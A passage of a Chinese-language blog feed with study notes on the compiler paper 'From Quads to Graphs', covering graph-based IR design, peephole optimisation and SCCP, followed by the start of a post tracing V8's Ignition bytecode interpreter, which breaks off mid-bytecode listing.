Inst的 class。 Figure 展示了了新的基类和一些继承的类。</p><p>我们使用的是函数式编程风格。我们创建并初始化了所有对象，但从未修改过。为了获得编译器对这种编程风格的支持，我们在类定义中插入了适当的 const 限定符。</p><ul><li>【NOTE】 纯函数式编程中的变量不是命令式编程中的变量，而是存储状态的单元，是不可变的（immutable）。也就是说不允许像命令式编程语言中那样多次给一个变量赋值。</li></ul><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003110.png" alt></p><h4><span id="51-virtual-optimizations">5.1 Virtual-Optimizations</span></h4><p>在 Figure 7 中的窥孔优化实例函数中，c++ 代码对每个对象类唯一的 opcode field 进行 switch。但在一个完整的实现中，switch 语句会变得相当巨大。另外，单个 opcode 的语义将被分为不同的 sections；一个 section 用于类定义，另一个用于窥孔优化。但我们更喜欢将 opcode 的所有语义放在一个地方:类成员函数。在 Figure 11 中，我们将 peephole function 分割成针对特定 opcode 的 virtual functions。</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003126.png" alt></p><p>要使哈希表起作用，我们必须能够 hash instr 和比较指令。不同的类封装指令具有不同的哈希函数和不同的比较语义。举个栗子：ADD 的source value 无论顺序如何其整体散列值应该一致。Figure 12 展示了 virtual hash 和 compare functions。</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003139.png" alt></p><h4><span id="52-faster-malloc">5.2 Faster-Malloc</span></h4><p>每次执行新指令时，我们都会调用操作符 new 来获得存储空间。但他反过来又会调用 malloc，可能相当耗时。此外，窥孔优化经常删除新创建的对象，需要调用 free。我们通过为 Instr 类 hook 特定于<strong>类</strong>的操作符 new 和 delete 来加速这些频繁的操作。首先我们需要为这种 replace operate 分配一个 arena。Arenas 中包含具有相似生存周期的堆分配对象（instrs）。生存周期结束后，我们会 delete 整个 arena，从而快速地 free 掉内含的所有 object。如图13所示：</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003151.png" alt></p><p><code>arena-&gt;next = pre_arena</code></p><p>Allocation 会检查当前 Arena 的空间大小。如果 Arena 没有足够的空间，则会在其中添加另一块内存。如果对象 fits，则返回对象地址的当前 hwm ，具体看代码。整体的 GC 风格是用<strong>内存指针的移动代替实际的内存分配释放</strong>。其中 Arena 的扩充以及 chunk chain 的释放算是唯二耗时的内存操作。</p><h4><span id="53-control-flow-issues">5.3 Control-Flow-Issues</span></h4><p>通过上述这些更改，我们的 IR 的整体设计终于变得清晰起来。每条指令都是一个独立的C++  object，其中包含确定 instr 如何与其周围的程序交互所需的所有信息。instr 的主要字段是 opcode。opcode_class 决定指令如何传播常量、处理代数恒等式并找到与其他指令一致的地方。为了使 IR 适配一种新的操作，我们需要定义一个新的 opcoded 和类——该类需要采集 data field 作为 intr’s input，而且需要提供窥孔优化以及 value-numbering 接口（hash），而不需要对窥孔或 value-numbering 本身进行任何更改。所以现在的 IR 具有相当强的可维护性。</p><h3><span id="6-two-tiers-to-one">6 Two-Tiers-to-One</span></h3><p>我们的 IR 有两个不同的 level：top_level，CFG 包含 Basic Blocks；bottom level，Basic Blocks包含 instr。过去，这种 seperate 对于 concerns 的分离很有用—— CFG 处理 conrtol flow，基本块处理 data flow。但是，我们希望用相同的机制处理这两种 dependence，因此我们需要消除这种壁垒。</p><p>先来看看 instr 怎么处理。抽象点来说，每个 instr 都可以当作一个 node 。 instr 的每个 input 都表示从定义指令的节点（def）到该指令的节点（use）的一条边（def -&gt; use 边）。edge 的方向正好和 instr 中的 input_pointer（use-def chain）的方向相反。这并不矛盾：我们恰好正在定义这样一个 abstract graph。像 Figure 14 所描述的那样，这个 “graph”的具体实现是从 sink<br>到 source (use to def) 的 edge 遍历，而不是从 source 到 sink (def to use)。 </p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003230.png" alt></p><p>为了确定何时执行，每个 instr 都要从 Basic Blocks 获取一个 control input。如果 input 是抽象图中的一条边，那么基本块必须是抽象图中的一个节点。所以，我们定义一个 Region instr 来替换基本块。 Region 指令将来自每个predecessor block 的 control 作为输入，并产生 merged control 作为输出。</p><p>由于 Region instr 作用是合并 control inputs，因此不局限于 separate control input 来确定何时执行。因此 control input 字段就可以移动到具体的 class-specific instr_class。Figure 15 展示了这种变化：</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003243.png" alt></p><p>如果basic blocks 以条件指令结尾，我们就把条件指令换作 IF。Figure 16 展示了 IF_instr<br>是如何工作的。</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003257.png" alt></p><p>左侧是这样的逻辑：predicate 提供 condition 判断语句，branch 将 control-flow 引导至不同的 block。然鹅通过显式的 control edge，IF instr 接受 control input 和 predicate 输入，然后产生 out-control 传递给不同的 Region。</p><p>【NOTE】这种转化后，其实该 graph 还是双层网状结构，只不过操作逻辑变成单一维度。</p><h4><span id="61-a-model-of-execution">6.1 A-Model-of-Execution</span></h4><p>在放弃基本块和 CFG 之后，我们的执行模型是什么？我们从中间表示的设计历史中获取线索。其实和四元组一样，我们的 IR 模型还是有两个分开的部分。就像 Figure 15 源码所述，我们只是在操作逻辑相同的单个 graph 中嵌入了两层 representation 维度。也就是说，我们的优化操作并不将这两层 subgraphs 区分开来，只是针对不同的 opcode 有不同的接口。</p><p><strong>control subgraph</strong> 使用 <a href="https://zh.wikipedia.org/zh-hans/Petri%E7%BD%91" target="_blank" rel="noopener">Petri net 模型</a>。 随着 exec 的进行，control token 在节点之间移动。这反映了 CFG 的工作方式：control flow 即 Basic block exec 顺序。control token 只存在于 Region / If / Start 指令中。Start 基本块被替换为产生初始 control token 的 Start 指令。随着指令的 exec，control token 也会随之前进。如果该 token 遇到了 STOP 指令，则执行停止。由于我们是使用 CFG 构造了当前 graph，所以我们确保在当前指令的所有传出边（control out）上只存在 Region / If / Stop 。</p><p><strong>data subgraph</strong> 不使用基于 token 的语义。 data node 的输出是其 input 和 function（opcode）的直接反映。因为没有记录状态的 token 存在，因此就不存在 Petri net。在每个 out edge 上，data value的数量都是无限的。直观地说，当一条指令需要 data instr 的值时，它会沿着 use-def 追溯到该 instrs，并读取存储在那里的值。在无环图中，这种根到叶的变化波动非常快。当数据值的传播趋于稳定时，control token 移动到下一个 Region 或 If 指令。Graph 中不可能只包含 data node ，每个循环都有 Compose / Region 指令</p><p>两个 subgraph 在两种不同的指令类型中混合：Compose/Select 指令和 If 指令。Compose / Select 组合读入 data 和 control ，并输出 data value。Select 不使用 control token，但会检查是否存在 control token。Select 的out 只有两种，一种是 data input 的拷贝，另一种就是 no-value。这当然取决于 control token 的存在与否。 Compose 输出它们的 previous value 或 present value。</p><p>IF 指令同时接受 data 和 control token ，并持有 True/False control token。两个可能的后继 region 只有一个能起到作用。在 Section 8.1，我们修改了 If 指令，使其行为更像其他 control handling 指令：给与两个后继，只有一个接收 control token。【图 9 和图 16 可以结合】</p><p>Figure 17 展示了一个简单的循环。Region 指令代替 Basic Blocks 作为 head 来处理该 loop 的 control-flow。Region &amp; If 构成 loop 的简易 control 框架；Select &amp; Compose 用来处理 SSA 形式下的变量混淆，接受的 control 参数分别为开始时的 Start 和 经历了 loop 的 If-false-control-out，对应的 data input 分别为 i0 和 i2。注意判断语句是作为 If_input 的 predicate ，outer 为 data。 </p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003318.png" alt></p><h4><span id="62-control-based-optimizations">6.2 Control-Based-Optimizations</span></h4><p>把 control 信息作为显式输入意味着我们可以在优化中使用它。一个具有 Constant test 的 IF 语句只能产出两个 control outs 中的一个，其中“live”边的 control out 就是 If 的 control in 的拷贝，而 If 则会在 dead 边的 head 部分输出 NULL（dead-out）。在我们讨论如何处理 If 的两个不同输出之后，图 24 提供了执行此操作的代码。（现在不急）</p><p>在做针对 ADD 的窥孔优化时，我们可以检查我们正在 Parse 的代码是否已经处于 dead 状态并立即将其删除。例如，当 DEBUG code 被编译出来，程序员将常量值传递给各种 flag 位时，可能存在某些选项 flag 为 0 的状况。然后相应地，If 产生 dead out，之后的 code 通过判断 dead out 将相应的 instr 删除（包括但不局限于 ADD）。 如 Figure 18。</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003344.png" alt></p><p>注意，我们返回 NULL 作为 unreachable instr 的定义指令。这意味着任何优化 unreachable instr 的尝试都将使用 NULL，fail 无疑。这种直觉是正确的：无法访问的代码永远不会执行，所以我们永远不应该尝试使用这样的代码。为了简洁起见，我们将在以后的示例中跳过对于 control inputs 是否为 Null 的检测。使用这些 NULL data values 的 Select 指令的 control inputs 同样为 Null（Null data 存在于 dead-path），因此也是 unreachable 的（从 control-flow 角度）。Compose instr 检测来自 Select 的 input：如果为 Dead，则直接移除。</p><p>Region 和 Compose 指令可以以类似的方式进行优化。Null input（dead-path）可以直接移除。如果 Region 和 Compose 的 input 是单一的，那么可以直接移除该 instrs（control token 均为拷贝）。在 Parse 过程中进行这些优化需要前端确认之后没有其他的 control path 可以到达 merge points。针对 if / then / else 这种结构化代码对应的 merge points，与其有关的所有 control-path 都是已知的。在解析完到达 merge points 的所有路径之后，可以优化 Region 和 Compose 指令。<del>而针对 label 对应的 merge point，前端只有在全部解析完 label 所在的 scope 才会进行优化。</del></p><h4><span id="63-value-numbering-and-control">6.3 Value-Numbering-and-Control</span></h4><p>如果我们把 control input 信息嵌入到 value numbering’s hash 和 key-compare functions 中，那么我们就可以避免位于不同基本块的等价 instr 的混淆，因此也就不需要再每个基本块结尾进行 hash table 的 flush。然鹅，这依然还只是本地的 value numbering。放弃 control 并且做到全局的 value numbering 我们将在 Section 9 中介绍。</p><h4><span id="64-a-uniform-representation">6.4 A-Uniform-Representation</span></h4><p>现在，我们使用了相同的 Inst 类来表示整个程序。control 和 data flow 统一表示为图中节点之间的边。从现在开始，我们会对 graph 进行细化，但我们不会对其进行任何重大更改。</p><p>在完成四元组到 graph 的转换之后，我们得到了什么？在下一节中，我们将看到有关窥孔优化的通用代码。此代码适用于所有指令类型，添加新的指令类型（或操作码）也不需要对其做任何更改。其工作包含：value-numbering ，constant folding 和 eliminating unreachable code.</p><h3><span id="7-types-and-pessimistic-optimizations">7 Types-and-Pessimistic-Optimizations</span></h3><p>我们以前的 vpeephole 结合了 constant folding 和 identity-function（对相同函数进行优化）。在 Section 10 中，conditional constant propagation 不能使用 identity-function 优化而且只需要 constant-finding 代码。所以我们 break up 原本 vpeephole 中的优化函数，将其分为两种：进行 constsnt folding 的 <strong>Compute</strong> 以及进行 identity-function 的 <strong>Identity</strong>。Compute 产生的 constant 被储存在 type 结构中。</p><p>type 就是一组值。我们感兴趣的是在 run-time 中的 value 以及类型。其结构如下：</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003406.png" alt></p><p>上下两个符号与 control flow 相关联，分别代表  control 的 unreachable 和 reachable but not constant。</p><p>identity-function 优化和 Compute 的代码如图 20 所示：<br><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003420.png" alt></p><p>如果 Identity 判断指令 x-instr 是某个其他指令 y-instr 的等效函数，则删除 x 并返回 y 来作为 x 的替代。删除 x-instr 并返回 y-instr 的操作仅在其他地方没有针对 x-instr 的引用的情况下有效（否则我们有空指针指向 x）。 因此，只有在我们最近在 Parse 期间创建了 x 时才能使用 Identity 代码。由于我们的目标是 during parsing 的优化，因此无伤大雅。</p><p>// 如果 instr 的 src 的 type.height 其中一个为 TOP，则<strong>无法</strong>继续常量折叠； 如果 instr 的 src 的 type.height 其中一个为 bottom，则<strong>无需</strong>继续常量折叠 </p><h4><span id="71-putting-it-together-pessimistic-optimizations">7.1 Putting it Together: Pessimistic Optimizations</span></h4><p>我们的下一个窥视孔优化器的工作原理如下：</p><ul><li>为每个 instr 进行 Compute Type</li><li>如果指令的类型是常量，则用 Constant 指令替换掉。先删后填使 new 和 delete 可以重复使用内存。这也意味着我们需要在删除之前保存相关的常量。</li><li>对 instr 进行 Value-numbering，尝试寻找以前存在的可替换的指令。我们在 old instr 上无需使用 Identity-function 优化，因为在其进入哈希表之前肯定经历过该类优化。</li><li>identity-function 优化。</li><li>如果我们没有找到替换指令，我们必须计算一个 hash value，并将其插入 hash table。</li><li>返回 optimized instruction</li></ul><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003434.png" alt></p><h4><span id="72-defining-multiple-values">7.2 Defining Multiple Values</span></h4><p>我们已经实现了我们的设计目标之一：使窥孔优化的代码简单和直接。根据我们的经验，这个窥孔优化将程序峰值内存大小（和运行时间）减少了一半。</p><p>然鹅，在我们现在的 IR 中对 IF 的处理还不够完善。IF 产生两个 seperate result。 If 的 user 被分为两组，具体的访问取决于他们可以得到的 result。到现在为止，没有任何一个非 If instr 具有这样的指令行为。在下一节中，我们将介绍几种产生多个值的指令类型，并尝试找到一种统一的解决方案来选择该类 instr 的 result。</p><h3><span id="8-more-engineering-concerns">8 More Engineering Concerns</span></h3><p>在最初的基于四元组的实现中，有好几种定义多个 value 的 instr。 例如，设置条件代码寄存器以及计算结果（即减法）和子程序调用（至少设置结果寄存器，条件代码和内存）的指令。以前，这些指示是在特别的 basis 上处理的，而如今我们要使用更正式的方法。</p><p>单个指令，例如 If ，产生多个不同的值（ true/false control-out ）是一件很令人头疼的问题。当我们引用这样的一条指令时，指的是哪个输出呢？我们通过引入“单个元组值（tuple）”来统一代替这样的 multi-defining 指令产生的 outs 来解决这个问题。然后我们使用 Projection 指令去掉我们想去掉的 piece of the tuple。每个 Projection 指令从 defining instruction 中获取 tuple 并生成一个简单 value。</p><p>Projection instr 没有 run-time 操作，换句话说，其运行在 zero cycles。如果都用 machine code 表示的话，tuple-producing 指令就是一个产生多个 result 的 machine code。而 Projection 仅仅是为不同的 result 指定不同的名称。</p><p>tuple-producer 的工作之一就是为 Projection <strong>Compute</strong> a new <strong>Type</strong>。该 Projection 指令的 Compute 代码通过将 Projection 传递给 tuple-producer 的 Compute，让 tuple-producer 确定 Projection 的 Type 并且使用该结果。由于 non-tuple-producing 指令永远不会成为 Projection 的目标，因此默认值是一个 ERROR，如图 22 所示。Identity 的处理是类似的。</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003450.png" alt></p><h4><span id="81-if-instructions">8.1 If Instructions</span></h4><p>If 指令接收 predicate 和 control input，并产生 true/false 两个 control out。分配给<br>True/False-Projection 并插入 Region 作为后继。示意图和代码如下：</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003501.png" alt></p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003512.png" alt></p><h4><span id="82-projection-instructions">8.2 Projection Instructions</span></h4><p>通过对 Projection 的定义，填补了我们模型中的一个主要空白。我们现在有关于 peepholer 如何查找和删除 unreachable code 的具体代码。到目前为止，每个 data 指令都包含一个 control input ，该 input 从本质上定义了指令属于哪个基本块。但在许多情况下，我们并不关心指令被放置在哪个块中，只要它在数据依赖关系得到满足和任何 uses 之前被执行即可。下一节中，我们就要删除 control input。</p><h3><span id="9-removing-control-information">9 Removing Control Information</span></h3><p>在我们的模型中，我们要求每个数据计算都有一个 control input ，以确定数据计算什么时候应该执行。事实上我们可以从数据计算中删除 control input ，并且完全依赖于 data dependence 。当然，这样做优缺点并存。优点是：</p><ul><li>图中较少的 edge 意味着较小的图形、较少的构建和操作工作。</li><li>value numbering 的工作原理是找到congruent（一致性的）sub-graph 段，其中 congruent （一致性）被定义为“一致性输入上的相等函数”。而一旦失去了 control input ，hash 就难以保证来源的差异性。所以 pessimistic value numbering 就要和 global value numbing 一样强。</li><li>缺少控制输入时，只剩下数据输入。计算中不再有”所属的基本块”的概念。跨基本块执行代码移动的调度器不需要知道指令有多大的自由度；<del>这些信息是显式的。</del></li></ul><p>缺点是：</p><ul><li>好无聊啊不想写2333</li></ul><h3><span id="10-optimistic-transformations">10 Optimistic Transformations</span></h3><p>Optimistic transformations，例如稀疏条件常数传播（Sparse Conditional Constant Propagation），会在优化过程中做出 optimistic assumptions 并尝试证明，有时可能需要分析整个程序以进行验证一个猜测。因此，我们需要在每条指令中保留有关当前 assumptions 的一些信息。该信息存储在 Type 字段中， Type 字段由前面定义的 Compute 设置。</p><p>我们依靠 <strong>pessimistic analysis</strong> 避免的这种 global analysis 的另一个条件就是需要就是 def-use edges。到目前为止，我们所有的优化都只能在给定一个 instr 和它的直接 uses 成分（即给定 use–&gt;def edges） 条件下执行。对于 <strong>optimistic transformations</strong> ，我们假设所有指令都是 undefined 以及所有的 code 都是 unreachable 。然后从 Start 开始，我们开始逐步验证并修改这些假设。当我们发现一条指令定义了除 “top” 以外的值时，我们就必须 inspect 所有使用该值的指令的 assumptions。因此我们需要 def-use edge。</p><p>因为我们需要全局(批处理)算法的 def-use edges，所以我们要一次性找到它们并将 single insruction 的 def-use edges 按照顺序放入一个大数组中。 要访问 该 instr 的 edges，我们需要指令中的 start 和 length 部分。因此我们为 instrument 引入了两个新的 field ：def_use_edge 和 def_use_cnt（count）。</p><p>我们通过遍历 graph 的 use-def edges 来找到 def-use edge。要进行图形遍历，我们需要一个 visit flag，一个 use-def edge 计数器，以及一个通过 index 访问 use-def edges 的函数。新构建的 instr 如下图所示：</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003527.png" alt></p><p>我们在图 27 中构建了def-use edge。我们需要使用 Stop 指令和 use-def edge 的数量作为输入以及构建一个空数组来保存 def-use edges。首先通过对 Graph 的一次遍历 pass，count 每个 Inst 的 def-use edges。在此步骤中，我们还将所有 Type 初始化为 “Top”。在第二次 pass ，我们将 edge value 存储到数组中，将数组部分的开始部分存储到 Inst 里去。因为我们从 Stop 指令开始所有的遍历并且只沿着 use-def edges 行进，所以我们不会访问到 dead code。也就是说，我们也不会将其将其表示出来。这就等同是在 SCCP 之前进行了一次 dead code elimination。</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003539.png" alt></p><p>接下来,我们运行 SCCP。我们把 start 指令放在 worklist 上。然后我们进入一个简单的循环：我们从 worklist 中提取一条指令，为其 compute 一个新的 Type ，如果与默认值不同，则将该指令的所有 uses 放回 worklist 中。当该 list 清空时，工作就完成了。</p><h4><span id="101-the-payoff">10.1 The Payoff</span></h4><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003551.png" alt></p><h3><span id="summary">Summary</span></h3><p>为了得到更快的 optimiser，我们决定在 front-end 做一些工作。我们推断，在 Parse 过程中进行的窥孔优化将减少 IR 的大小和后期优化阶段的开销。</p><p>我们以SSA形式进行了前端构建。因为我们在 Parsing 时无法分析整个程序，所以必须插入很多的 Φ-Functions 。我们注意到 variable names 是程序表达式的一对一映射。，因此我们用 instr-pointer 来进行替换。此时表达式中的 name 字段就显得毫无用处，因此我们果断的进行 dst 的删除。我们还观察到了 basic blocks 内的隐式控制流，我们对此进行了显式控制（因此需要进行优化）。我们还发现，在尝试编写 unreachable code elimination 的窥孔优化时，我们的模型是 non-compositional（分离操作的属性，可进行显式的操作），我们通过在 Φ-Functions 中引入 control 并将其分解为 Select 和 Compose 两条指令来解决这一问题。</p><p>紧接着我们利用了c++ 的继承机制，并将 Insts 重新构造为单独的类以用于每一种 instr。我们还插入了专门的 new 和 delete 功能。</p><p>这时候我们注意到 Basic Block 结构只包含了一些 typical dependence，这和一个典型的 instr 没有什么两样，因此我们直接将其替换为 Region 。因此我们一直使用的窥孔优化现在允许我们除常规的 constant fold 和  value numbering 之外进行 unreachable code elimination。</p><p>我们将每条指令的 peephole 分解为 constant folding（compute）和 identity-function 优化。其中的 constant folding 在 global opt 中被使用。</p><p>最后我们优化了SCCP。</p><h3><span id="reference">Reference</span></h3><p><a href="https://pdfs.semanticscholar.org/bcd5/8efdba831751d3b5ff2fe0bbd9e719034816.pdf" target="_blank" rel="noopener">From Quads to Graphs: An Intermediate Representation’s Journey</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Intro-From-Quads-to-Graphs&quot;&gt;&lt;a href=&quot;#Intro-From-Quads-to-Graphs&quot; class=&quot;headerlink&quot; title=&quot;Intro: From Quads to Graphs&quot;&gt;&lt;/a&gt;Intro: From Quads to Graphs&lt;/h2&gt;
    
    </summary>
    
      <category term="Browser Explore" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/"/>
    
      <category term="Basic" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/Basic/"/>
    
    
      <category term="Browser Explore" scheme="http://p1umer.gituhb.io/tags/Browser-Explore/"/>
    
      <category term="Basic" scheme="http://p1umer.gituhb.io/tags/Basic/"/>
    
  </entry>
  
  <entry>
    <title>V8 Iginition Interpreter</title>
    <link href="http://p1umer.gituhb.io/2018/07/10/V8-Iginition-Interpreter/"/>
    <id>http://p1umer.gituhb.io/2018/07/10/V8-Iginition-Interpreter/</id>
    <published>2018-07-10T06:45:19.000Z</published>
    <updated>2019-07-04T16:38:29.636Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="intro-analysis-of-ignition">Intro: Analysis of Ignition</span></h2> <a id="more"></a><h2><span id="什么是字节码解释器">什么是字节码解释器？</span></h2><p>解释器是一种顺序执行源代码的引擎。在过去的V8中，源代码被立即编译到汇编程序并执行，但与之不同，解释器将源代码转换为高级字节指令并按顺序执行字节指令。感觉就像一个高级汇编程序。</p><h2><span id="ignition概要">Ignition概要</span></h2><p>Ignition是一个基于寄存器的字节码解释器。与Java的堆栈基础不同，它实际上将值分配给CPU的寄存器并执行它们。在Ignition中，预先生成一个名为BytecodeHandler的字节码处理函数，从字节码中获取数组索引，<br>并将生成的处理函数分配给索引，一个接一个地循环Bytecode数组，并使用相应索引的函数执行调用代码。<br>简化版本的js代码如下：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var Bytecodes = [0,1,2,3,4,5];</span><br><span class="line">var index = 0;</span><br><span class="line">function dispatch(next) &#123;BytecodeHandlers[next]();&#125;</span><br><span class="line">const BytecodeHandlers = &#123;</span><br><span class="line">  [&apos;0&apos;]() &#123;...; dispatch(Bytecodes[index++])&#125;,</span><br><span class="line">  [&apos;1&apos;]() &#123;...; dispatch(Bytecodes[index++])&#125;,</span><br><span class="line">  [&apos;2&apos;]() &#123;...; dispatch(Bytecodes[index++])&#125;,</span><br><span class="line">  [&apos;3&apos;]() &#123;...; dispatch(Bytecodes[index++])&#125;,</span><br><span class="line">  [&apos;4&apos;]() &#123;...; dispatch(Bytecodes[index++])&#125;,</span><br><span class="line">  [&apos;5&apos;]() &#123;...; dispatch(Bytecodes[index++])&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2><span id="ignition结构">Ignition结构</span></h2><h3><span id="字节码生成的函数调用">字节码生成的函数调用</span></h3><p>Ignition 从Javascript AST 生成 bytecodes</p><p>检查这个bytecodes生成步骤。</p><ol><li>由于BytecodeGenerator实现了AstVisitor，在Javascript AST中运行时创建相应的字节码。 </li><li>BytecodeGenerator位于src / interpreter / bytecode - generator.h中</li><li>字节码生成方法是BytecodeGenerator :: GenerateBytecode。</li><li>InterpreterCompilationJob :: ExecuteJobImpl（src / interpreter / interpreter.cc）中调用BytecodeGenerator :: GenerateBytecode。</li><li>InterpreterCompilationJob :: ExecuteJobImpl由静态Interpreter :: NewCompilationJob执行。</li></ol><p>Interpreter :: NewCompilationJob的层次结构如下。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Interpreter::NewCompilationJob</span><br><span class="line">|</span><br><span class="line">InterpreterCompilationJob::ExecuteJobImpl</span><br><span class="line">|</span><br><span class="line">BytecodeGenerator::GenerateBytecode</span><br></pre></td></tr></table></figure></p><p>由于这个静态Interpreter :: NewCompilationJob是一个在编译器管道中生成Job的方法，让我们看一下compiler.cc（src / compiler.cc）。<br>compiler.cc（src / compiler.cc）有一个非常复杂且难以理解的调用层次结构，并且与可选的设置解析器设置一起读取也很困难。<br>调用堆栈如下所示。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ScriptCompiler::Compile</span><br><span class="line">|</span><br><span class="line">ScriptCompiler::CompileUnboundInternal</span><br><span class="line">|</span><br><span class="line">Compiler::GetSharedFunctionInfoForScript</span><br><span class="line">|</span><br><span class="line">Compiler::CompileToplevel</span><br><span class="line">|</span><br><span class="line">CompileUnoptimizedCode(compiler.cc)</span><br><span class="line">|</span><br><span class="line">CompileUnoptimizedInnerFunctions</span><br><span class="line">|</span><br><span class="line">GenerateUnoptimizedCode</span><br><span class="line">|</span><br><span class="line">GetUnoptimizedCompilationJob</span><br><span class="line">|</span><br><span class="line">---- Iginitionオプションによってfullcodegenと分岐</span><br><span class="line">| |</span><br><span class="line">Interpreter::NewCompilationJob</span><br><span class="line">  |</span><br><span class="line">  FullCodeGenerator::NewCompilationJob</span><br></pre></td></tr></table></figure></p><p>ScriptCompiler :: Compile是V8的Javascript编译器的入口点，并按顺序调用该函数，最后创建Job of Interpreter。</p><p>到最终的BytecodeGenerator :: GenerateBytecode的调用堆栈如下。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ScriptCompiler::Compile</span><br><span class="line">|</span><br><span class="line">ScriptCompiler::CompileUnboundInternal</span><br><span class="line">|</span><br><span class="line">Compiler::GetSharedFunctionInfoForScript</span><br><span class="line">|</span><br><span class="line">Compiler::CompileToplevel</span><br><span class="line">|</span><br><span class="line">CompileUnoptimizedCode(compiler.cc)</span><br><span class="line">|</span><br><span class="line">CompileUnoptimizedInnerFunctions</span><br><span class="line">|</span><br><span class="line">GenerateUnoptimizedCode</span><br><span class="line">|</span><br><span class="line">GetUnoptimizedCompilationJob</span><br><span class="line">|</span><br><span class="line">---- Branch with fullcodegen by Iginition option</span><br><span class="line">| |</span><br><span class="line">| FullCodeGenerator::NewCompilationJob</span><br><span class="line">|</span><br><span class="line">Interpreter::NewCompilationJob</span><br><span class="line">|</span><br><span class="line">InterpreterCompilationJob::ExecuteJobImpl</span><br><span class="line">|</span><br><span class="line">BytecodeGenerator::GenerateBytecode</span><br></pre></td></tr></table></figure><h3><span id="字节码生成">字节码生成</span></h3><p>现在我们知道调用层次结构，看看如何生成字节码。由于字节码生成继承自前面编写的AstVisitor，因此有Visit必要实现各种方法。<br>JavaScript代码：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a = 1;</span><br></pre></td></tr></table></figure></p><p>字节码<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0  [generating bytecode for function: ]</span><br><span class="line">1  Parameter count 1</span><br><span class="line">2  Frame size 32</span><br><span class="line">3           0x3f5e20aafdf6 @    0 : 09 00             LdaConstant [0]</span><br><span class="line">4           0x3f5e20aafdf8 @    2 : 1f f9             Star r1</span><br><span class="line">5           0x3f5e20aafdfa @    4 : 02                LdaZero</span><br><span class="line">6           0x3f5e20aafdfb @    5 : 1f f8             Star r2</span><br><span class="line">7           0x3f5e20aafdfd @    7 : 20 fe f7          Mov &lt;closure&gt;, r3</span><br><span class="line">8           0x3f5e20aafe00 @   10 : 55 aa 01 f9 03    CallRuntime [DeclareGlobalsForInterpreter], r1-r3</span><br><span class="line">9      0 E&gt; 0x3f5e20aafe05 @   15 : 92                StackCheck</span><br><span class="line">10   116 S&gt; 0x3f5e20aafe06 @   16 : 09 01             LdaConstant [1]</span><br><span class="line">11          0x3f5e20aafe08 @   18 : 1f f9             Star r1</span><br><span class="line">12          0x3f5e20aafe0a @   20 : 02                LdaZero</span><br><span class="line">13          0x3f5e20aafe0b @   21 : 1f f8        